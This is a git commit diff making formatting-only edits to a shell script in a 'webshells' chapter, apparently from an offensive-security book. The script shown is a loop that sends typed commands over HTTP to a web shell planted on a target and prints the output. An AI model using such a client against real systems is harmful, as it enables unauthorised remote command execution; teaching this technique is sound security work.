89ac2c6faf26ccf423e9ef4c7bf1e4a98a1e6d77
Dolev Farhi <farhi.dolev@gmail.com>
2023-07-13 12:57:18 -0400

    formatting

--- ch06/webshells/webshell.sh
+++ ch06/webshells/webshell.sh
@@ -6,9 +6,7 @@ read -rp 'Port: ' port
 while true; do
   read -rp '$ ' raw_command
   command=$(printf %s "${raw_command}" | jq -sRr @uri)
-
   response=$(curl -s -w "%{http_code}" -o /dev/null "http://${host}:${port}/webshell/${command}")
-
   http_code=$(tail -n1 <<< "$response")
 
   # Check if the HTTP status code is a valid integer
@@ -16,7 +14,7 @@ while true; do
     if [ "${http_code}" -eq 200 ]; then
       curl "http://${host}:${port}/webshell/${command}"
     else
-      echo "Error: HTTP status code $http_code"
+      echo "Error: HTTP status code ${http_code}"
     fi
   else
     echo "Error: Invalid HTTP status code received"
